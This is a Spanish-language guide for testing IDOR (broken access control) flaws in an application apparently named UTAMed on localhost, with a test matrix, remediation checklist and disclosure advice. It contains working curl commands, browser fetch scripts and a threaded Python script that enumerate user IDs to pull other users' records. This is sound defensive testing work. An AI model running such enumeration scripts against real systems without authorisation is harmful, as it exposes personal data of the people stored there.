# Guía de Pruebas de IDOR - UTAMed

**Objetivos**: Validar las vulnerabilidades IDOR identificadas en el análisis de seguridad

---

## 🧪 Pruebas Prácticas

### Prueba 1: Acceso no autorizado a datos de usuarios

#### Escenario: Docente intentando ver datos de otro usuario

```bash
# 1. Loguear como Docente
# - URL: http://localhost:8000/login
# - Usar credenciales de docente

# 2. Abrir DevTools (F12) → Network

# 3. Intentar acceder a endpoint de usuario
# Copiar cualquier ID de usuario (ej: 5) y hacer:

curl -H "Cookie: [tu_cookie_de_sesion]" \
  "http://localhost:8000/admin/usuarios/5?tipo=estudiante"

# RESULTADO ESPERADO ❌:
# 403 Forbidden - No tienes permiso

# RESULTADO ACTUAL ✗ (VULNERABLE):
# 200 OK + JSON con datos del usuario
```

**Test Script para Browser**:
```javascript
// Copiar en DevTools Console estando logueado como docente
fetch('/admin/usuarios/1?tipo=estudiante')
  .then(r => r.json())
  .then(data => console.log(data))
  // Si ves datos del usuario: VULNERABLE ❌
```

---

### Prueba 2: IDOR en team endpoints

#### Escenario: Docente intentando modificar equipo de otro docente

```bash
# 1. Loguear como Docente1

# 2. Identificar un Curso que Docente2 maneja
# Ej: /docente/cursos/{curso_del_otro_docente}/team

# 3. Intentar agregar usuario
curl -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: [tu_cookie]" \
  -d '{"id_usuario": 10, "role_name": "Ayudante"}' \
  "http://localhost:8000/docente/cursos/999/team"

# RESULTADO ESPERADO ❌:
# 403 Forbidden

# RESULTADO ACTUAL ✓ (PROBABLEMENTE SEGURO):
# Si el curso no es tuyo, debería fallar
```

---

### Prueba 3: Enumeration Attack - Descubrir IDs de usuarios

```bash
# Loguear como docente y ejecutar en DevTools Console

async function discoverUsers() {
  for (let i = 1; i <= 100; i++) {
    try {
      const response = await fetch(`/admin/usuarios/${i}?tipo=estudiante`);
      if (response.ok) {
        const data = await response.json();
        console.log(`ID ${i}: ENCONTRADO -`, data.nombre1, data.nombre2);
      }
    } catch(e) {}
  }
}

discoverUsers();

// Si ve muchos usuarios: IDOR confirmado ❌
// Si solo ve errores 403: Probablemente seguro ✓
```

---

### Prueba 4: Rate Limiting

```bash
# Ejecutar 100 solicitudes en corto tiempo

for i in {1..100}; do
  curl -H "Cookie: [tu_cookie]" \
    "http://localhost:8000/admin/usuarios/$i" \
    2>/dev/null &
done

# RESULTADO ESPERADO ✓:
# Después de ~10 solicitudes:
# 429 Too Many Requests

# RESULTADO ACTUAL ❌ (SIN RATE LIMIT):
# Todas las solicitudes se procesa
```

---

### Prueba 5: Validar Authorización en /sync-permissions

```javascript
// En DevTools Console como Docente1

// Obtener un usuario de otro docente (fuera de tu contexto)
const userId = 999; // Usuario que NO está en tu equipo
const cursoId = 1;  // Tu curso

// Intentar sincronizar permisos
fetch(`/docente/cursos/${cursoId}/team/${userId}/sync-permissions`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
  },
  body: JSON.stringify({
    roles: [],
    special_permissions: []
  })
})
.then(r => r.json())
.then(d => console.log(d))

// ESPERADO ❌: 404 o 403 - Usuario no es miembro
// ACTUAL ✓ (PROBABLEMENTE): Error similar
```

---

## 📊 Matriz de Pruebas

| # | Prueba | Punto de Entrada | Mitigación Actual | Resultado |
|---|--------|------------------|------------------|-----------|
| 1 | Ver datos de otro usuario | `/admin/usuarios/{id}?tipo=` | ❌ NINGUNA | 🔴 VULNERABLE |
| 2 | Modificar equipo ajeno | `/docente/cursos/{id}/team` | ⚠️ PARCIAL | 🟡 REVISAR |
| 3 | Enumeration de usuarios | `/admin/usuarios/{id}` | ❌ NINGUNA | 🔴 VULNERABLE |
| 4 | Brute force sin límite | Todos los endpoints | ❌ NINGUNA | 🔴 VULNERABLE |
| 5 | Modificar permisos ajenos | `/sync-permissions` | ⚠️ PARCIAL | 🟡 REVISAR |

---

## 🛠️ Herramientas Recomendadas

### 1. OWASP ZAP (Escaneo automático)
```bash
# Descargar: https://www.zaproxy.org/

# Usar modo "Attack" contra endpoints
# Parámetros a probar: id, user_id, curso_id, usuario
```

### 2. Burp Suite Community
```
- Interceptar requests
- Modificar parámetros manualmente
- Grabar macros de ataque
```

### 3. Script personalizado de Python
```python
import requests
from concurrent.futures import ThreadPoolExecutor

session = requests.Session()
session.auth = ('docente@utamed.local', 'password')

def test_idor(user_id):
    response = session.get(f'http://localhost:8000/admin/usuarios/{user_id}?tipo=estudiante')
    if response.status_code == 200:
        print(f"✗ VULNERABLE: ID {user_id} accesible")
        return True
    return False

with ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(test_idor, range(1, 100)))

print(f"Usuarios accesibles sin autorización: {sum(results)}")
```

---

## 📝 Reporte de Resultados

### Plantilla para documentar hallazgos

```
VULNERABILIDAD: [Tipo de IDOR]
SEVERITY: [CRÍTICO/ALTO/MEDIO/BAJO]
FECHA: [Hoy]

Descripción:
[Qué se puede hacer sin autorización]

Pasos para reproducir:
1. [Paso 1]
2. [Paso 2]
3. ...

Impacto:
- [Riesgo 1]
- [Riesgo 2]

Prueba de Concepto:
[URL o código]

Remediación:
[Cómo arreglarlo]
```

---

## ✅ Checklist de Validación

Después de cada fix, validar:

- [ ] No puedo ver datos de otros usuarios siendo docente
- [ ] No puedo modificar cursos que no administro
- [ ] No puedo cambiar permisos de usuarios fuera de mi contexto
- [ ] Rate limiting activo (max 60 req/min)
- [ ] Errors 403/404 cuando acceso sin autorización
- [ ] Auditoría registra intentos fallidos de acceso
- [ ] CSRF tokens válidos en todas las formas
- [ ] Parámetros validados (ej: tipo ∈ ['estudiante','docente'])

---

## 🔗 Endpoints Críticos a Probar

### Máxima Prioridad
- `GET/POST/PUT/DELETE /admin/usuarios/{id}`
- `GET/POST/DELETE /docente/cursos/{id}/team`
- `POST /docente/cursos/{id}/team/{usuario}/sync-permissions`

### Alta Prioridad
- `GET /docente/cursos/{id}/team/{usuario}/permissions`
- `POST /admin/cursos/{id}/team`
- `DELETE /admin/cursos/{id}/team/{usuario}`

### Revisar
- Todos los endpoints en `/admin/*` con parámetros ID
- Todos los endpoints que retornan datos sensitivos

---

## 📞 Reportar Resultados

Si confirmas alguna vulnerabilidad:

1. **NO lo publiques** en redes sociales
2. **Reporta inmediatamente** al equipo de desarrollo
3. **Incluye**:
   - Paso exacto para reproducir
   - Credenciales de test (no producción)
   - Captura o video
   - Impacto potencial

---

**Última actualización**: 2026-02-05
